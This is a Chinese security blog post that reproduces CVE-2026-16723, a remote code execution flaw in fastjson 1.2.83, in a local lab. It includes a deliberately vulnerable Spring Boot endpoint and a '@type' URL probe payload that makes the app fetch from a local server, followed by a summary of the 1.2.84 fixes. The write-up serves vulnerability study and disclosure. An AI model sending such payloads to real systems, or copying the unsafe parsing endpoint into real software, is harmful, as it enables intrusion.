---
layout: post
tags: [RealWorld]
title: "CVE-2026-16723复现（fastjson rce）"
author: wsxk
date: 2026-8-3
comments: true
---


- [1. 漏洞介绍](#1-漏洞介绍)
- [2. 漏洞复现](#2-漏洞复现)
  - [2.1 环境构建](#21-环境构建)
  - [2.2 实际验证](#22-实际验证)
- [3. 漏洞修复](#3-漏洞修复)
- [4. 插曲: 长亭发现fastjson2 rce问题](#4-插曲-长亭发现fastjson2-rce问题)
- [references](#references)


# 1. 漏洞介绍<br>
Fastjson 是阿里巴巴开源的一款高性能 Java JSON 解析库，支持将 Java 对象序列化为 JSON 字符串以及将 JSON 字符串反序列化为 Java 对象。该库凭借其出色的解析性能和简洁的 API 设计，在国内 Java 生态系统中占据主导地位，被广泛应用于企业级后端服务、微服务网关、数据接口层、缓存序列化以及日志处理等核心生产场景，是国内 Java 开发者最常用的 JSON 处理组件之一。<br>
近期`fastjson`被爆出有CVE,能够做到RCE，阿里官方库也报了相应的情况<br>
[https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83](https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83)<br>
其cve编号:<br>
[https://www.cve.org/CVERecord?id=CVE-2026-16723](https://www.cve.org/CVERecord?id=CVE-2026-16723)<br>

# 2. 漏洞复现<br>
## 2.1 环境构建<br>
目录结构:<br>
```
fastjson-cve-lab/
├─ pom.xml
└─ src/main/
   ├─ java/lab/Application.java
   └─ resources/application.properties
```
pom.xml内容:<br>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         https://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.18</version>
    </parent>

    <groupId>lab</groupId>
    <artifactId>fastjson-cve-lab</artifactId>
    <version>0.0.1-SNAPSHOT</version>

    <properties>
        <java.version>17</java.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <!-- 漏洞版本 -->
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.83</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
```
src/main/java/lab/Application.java：<br>
```java
package lab;

import com.alibaba.fastjson.JSON;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication
@RestController
public class Application {

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @PostMapping(value = "/parse", consumes = "application/json")
    public String parse(@RequestBody String body) {
        try {
            JSON.parse(body);
            return "parsed";
        } catch (Exception e) {
            return e.getClass().getName() + ": " + e.getMessage();
        }
    }
}
```
src/main/resources/application.properties：<br>
```
server.address=127.0.0.1
server.port=8080
```
确保内容已经填充后，使用mvn进行打包:<br>
```
mvn -q -DskipTests clean package
mvn dependency:tree "-Dincludes=com.alibaba:fastjson"
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260803233106.png)


## 2.2 实际验证<br>
确保构建的包没有出问题:<br>
```
jar tf .\target\fastjson-cve-lab-0.0.1-SNAPSHOT.jar |
    Select-String "BOOT-INF/lib/fastjson"
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260803233211.png)

启动构建的java包:<br>
```
java -jar .\target\fastjson-cve-lab-0.0.1-SNAPSHOT.jar
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260803234119.png)
因为笔者在windows下复现该漏洞，不想多做折腾,为了验证该服务确实执行了我注入的命令，我在本地起了一个http服务器<br>
```
python -m http.server 31337 --bind 127.0.0.1
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260803234459.png)
**如果本地服务器能够收到来自fastjson应用的请求，说明命令执行成功了（并没有考虑完整的利用方法，仅复现）**<br>
现在对`fastjson应用`发送请求:<br>
```
$body = '{"@type":"http://2130706433:31337/probe"}'

Invoke-WebRequest `
  -Uri "http://127.0.0.1:8080/parse" `
  -Method Post `
  -ContentType "application/json" `
  -Body $body
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260804000009.png)
说明`fastjson应用`解析了我的恶意请求，朝着我自己启动的python服务器发送了请求。<br>


# 3. 漏洞修复<br>
官方说明中，1.2.84 主要进行了这些修改：<br>
```
1. 在 ParserConfig.checkAutoType 和 TypeUtils.loadClass 中提前拒绝包含 :、! 等 URL 特殊字符的类型名。

2. 阻止攻击者控制的类型名进入 getResourceAsStream() 资源探测和类加载路径。

3. 白名单哈希命中后增加类型名文本复核。

4. 防止白名单前缀覆盖 ClassLoader、DataSource、RowSet 等危险基类。

5. 修复重复解析时可能从类缓存中返回黑名单类的问题。
```
相关链接:[https://github.com/alibaba/fastjson/commit/ad353ff71e27a587bfb18cab329572fd5cc44ea6](https://github.com/alibaba/fastjson/commit/ad353ff71e27a587bfb18cab329572fd5cc44ea6)<br>

# 4. 插曲: 长亭发现fastjson2 rce问题<br>
这个cve在刚发布没一周，长亭就宣布其发现了`fastjson2`中存在类似的rce问题。<br>
[【原创0day】Fastjson2 远程代码执行漏洞](https://mp.weixin.qq.com/s/LJaul1jNjK9pXRAkoUiMEA)<br>
合理猜测是在已知`fastjson`漏洞的情况下，在`fastjson2`中用人上人模型跑了一把有没有类似漏洞，还真给他找到了....（猜的，猜的，猜的）<br>
`fastjson2`的问题最终没有cve编号，而是合并到[https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83](https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83)中一并解释了另一个问题并做了修复。<br>
详情可看[https://github.com/alibaba/fastjson2/releases/tag/2.0.63](https://github.com/alibaba/fastjson2/releases/tag/2.0.63)<br>



# references<br>
[https://fearsoff.org/cn/research/fastjson-1-2-83-rce](https://fearsoff.org/cn/research/fastjson-1-2-83-rce)<br>
[https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83](https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83)<br>
[https://www.cve.org/CVERecord?id=CVE-2026-16723](https://www.cve.org/CVERecord?id=CVE-2026-16723)<br>
[【原创0day】Fastjson2 远程代码执行漏洞](https://mp.weixin.qq.com/s/LJaul1jNjK9pXRAkoUiMEA)<br>


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>